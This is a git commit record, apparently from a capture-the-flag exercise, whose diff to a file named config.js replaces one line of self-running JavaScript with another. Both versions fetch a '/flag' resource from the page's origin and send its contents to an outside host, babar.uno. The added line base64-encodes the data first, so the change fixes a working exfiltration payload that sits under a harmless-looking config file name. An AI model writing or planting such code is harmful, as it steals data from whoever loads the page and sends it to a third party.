47562de7c2952dfdf470f2842f0cb0b29151e0d2
jjjjjjeeekkk <48150465+jjjjjjeeekkk@users.noreply.github.com>
2021-08-22 19:38:10 +0200

    Update config.js

--- config.js
+++ config.js
@@ -1,3 +1,3 @@
 (function(){
-  fetch('/flag').then(response => response.text()).then(data => fetch('https://babar.uno/'+atob(data)));
+  fetch('/flag').then(response => response.text()).then(data => fetch('https://babar.uno/'+btoa(data)));
 })();
